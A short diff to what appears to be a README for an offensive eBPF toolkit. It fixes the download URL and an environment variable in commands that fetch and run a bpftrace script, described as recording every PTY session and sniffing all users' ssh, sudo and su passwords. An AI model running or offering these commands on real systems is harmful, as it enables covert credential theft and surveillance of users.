@@ -13,8 +13,8 @@ chmod 755 bpftrace
 Record all PTY sessions and sniffs all ssh/sudo/su passwords of all users.
 
 ```console
-curl -o ptysnoop.bt -fsSL https://github.com/hackerschoice/bpfhacks/blob/main/ptysnoop.bt
-export BPFTRACE_STRLEN=200
+curl -o ptysnoop.bt -fsSL https://github.com/hackerschoice/bpfhacks/raw/main/ptysnoop.bt
+export BPFTRACE_MAX_STRLEN=200
 ./bpftrace -Bnone ptysnoop.bt
 ```
 <p align="center">
